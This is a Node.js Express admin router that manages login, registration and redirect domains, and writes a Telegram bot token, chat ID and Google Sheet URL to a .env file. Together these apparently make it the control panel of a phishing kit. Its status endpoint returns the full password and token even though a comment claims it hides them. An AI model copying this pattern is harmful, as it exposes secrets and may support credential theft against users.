const express = require("express");
const router = express.Router();
const fs = require("fs");
const path = require("path");

// ============================================================
// Helper to update root .env file and process.env
// ============================================================
function updateEnvFile(updates) {
  const envPath = path.join(__dirname, "..", ".env");
  let envContent = "";
  if (fs.existsSync(envPath)) {
    envContent = fs.readFileSync(envPath, "utf-8");
  }
  let lines = envContent.split("\n");

  for (const [key, value] of Object.entries(updates)) {
    process.env[key] = value;
    let found = false;
    lines = lines.map((line) => {
      if (line.startsWith(`${key}=`)) {
        found = true;
        return `${key}=${value}`;
      }
      return line;
    });
    if (!found) {
      lines.push(`${key}=${value}`);
    }
  }
  fs.writeFileSync(envPath, lines.join("\n"), "utf-8");
}

// ============================================================
// Admin Authentication Middleware
// ============================================================
function requireAuth(req, res, next) {
  if (req.session && req.session.isAdmin) {
    return next();
  }
  return res.redirect("/admin/login");
}

// ============================================================
// Login Page
// ============================================================
router.get("/login", (req, res) => {
  const error = req.query.error || "";
  res.render("admin/login", { layout: false, error });
});

router.post("/login", (req, res) => {
  const { password } = req.body;
  if (password === process.env.ADMIN_PASSWORD) {
    req.session.isAdmin = true;
    return res.redirect("/admin");
  }
  return res.redirect("/admin/login?error=Sai mật khẩu!");
});

router.get("/logout", (req, res) => {
  req.session.destroy();
  return res.redirect("/admin/login");
});

// ============================================================
// Dashboard (requires auth)
// ============================================================
router.get("/", requireAuth, (req, res) => {
  const domainConfig = req.app.locals.domainConfig;
  res.render("admin/index", {
    layout: false,
    domainConfig,
  });
});

// ============================================================
// API: Update domains
// ============================================================
router.post("/api/domains", requireAuth, (req, res) => {
  const { redirectDomain, loginDomain, regDomain } = req.body;
  const domainConfig = req.app.locals.domainConfig;

  if (redirectDomain !== undefined) {
    domainConfig.redirectDomain = redirectDomain.startsWith("https://")
      ? redirectDomain
      : `https://${redirectDomain}`;
  }
  if (loginDomain !== undefined) {
    domainConfig.loginDomain = loginDomain.startsWith("https://")
      ? loginDomain
      : `https://${loginDomain}`;
  }
  if (regDomain !== undefined) {
    domainConfig.regDomain = regDomain.startsWith("https://")
      ? regDomain
      : `https://${regDomain}`;
  }

  return res.json({ success: true, domainConfig });
});

// ============================================================
// API: Update system configuration (.env)
// ============================================================
router.post("/api/config", requireAuth, (req, res) => {
  const { ADMIN_PASSWORD, TELEGRAM_TOKEN, CHAT_ID, GOOGLE_SHEET_URL } = req.body;
  
  const updates = {};
  if (ADMIN_PASSWORD !== undefined) updates.ADMIN_PASSWORD = ADMIN_PASSWORD;
  if (TELEGRAM_TOKEN !== undefined) updates.TELEGRAM_TOKEN = TELEGRAM_TOKEN;
  if (CHAT_ID !== undefined) updates.CHAT_ID = CHAT_ID;
  if (GOOGLE_SHEET_URL !== undefined) updates.GOOGLE_SHEET_URL = GOOGLE_SHEET_URL;

  try {
    updateEnvFile(updates);
    return res.json({ success: true, message: "System settings updated successfully." });
  } catch (error) {
    console.error("Error writing config:", error);
    return res.status(500).json({ success: false, error: "Failed to save settings." });
  }
});

// ============================================================
// API: Get current status
// ============================================================
router.get("/api/status", requireAuth, (req, res) => {
  const domainConfig = req.app.locals.domainConfig;
  const recentLogs = req.app.locals.recentLogs || [];
  
  // Safe env data (hiding part of token/password for production safety)
  const safeEnv = {
    ADMIN_PASSWORD: process.env.ADMIN_PASSWORD || "",
    TELEGRAM_TOKEN: process.env.TELEGRAM_TOKEN || "",
    CHAT_ID: process.env.CHAT_ID || "",
    GOOGLE_SHEET_URL: process.env.GOOGLE_SHEET_URL || ""
  };

  res.json({ 
    domainConfig, 
    recentLogs, 
    env: safeEnv,
    uptime: process.uptime() 
  });
});

module.exports = router;
